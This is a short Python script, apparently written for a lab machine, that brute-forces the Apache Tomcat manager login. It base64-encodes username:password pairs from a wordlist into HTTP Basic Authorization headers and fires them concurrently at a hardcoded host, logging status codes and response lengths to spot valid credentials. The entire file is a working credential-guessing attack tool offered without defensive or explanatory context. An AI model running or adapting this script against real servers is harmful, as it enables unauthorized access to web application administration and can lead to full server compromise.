##################################################################
#         Author by Cristhoper Heredia aka X0pr4nt3s             #
##################################################################
from multiprocessing.pool import ThreadPool as Pool
import base64
import string
from wsgiref import headers
import requests

##################################################################
#               Tomcat manager brute force                       #
##################################################################
def apache_tomcat_enum_bruteforce():
    file1 = open('payloads', 'r')
    Lines = file1.readlines()
    payload=[]

    for i in Lines:
        credentials=i.rstrip('\n').encode('ascii')
        credentialsbase64=base64.b64encode(credentials)
        payload.append(credentialsbase64.decode('ascii'))
    
    url="http://10.10.10.95:8080/manager/html"
    
    bool_result="Credenciales : "
    lista_de_resultados=[]

    def request_tomcat(indice):
        credenciales="Basic "+indice
        headers_data={'Authorization':credenciales}
        result=requests.get(url,headers=headers_data)
        print((base64.b64decode(indice)).decode('ascii')," - ",result.status_code," - ",len(result.content))
        #palabra=""
        #if(result.status_code==200):
        #palabra=string((base64.b64decode(indice)).decode('ascii')) +" - "+ string(result.status_code) + " - "+string(len(result.content))
        #print(palabra)
            

    
    
    pool_size = 10
    pool = Pool(pool_size)
    
    for i in payload:
        pool.apply_async(request_tomcat,(i,))
    
    pool.close()
    pool.join()

###############################################################

apache_tomcat_enum_bruteforce()





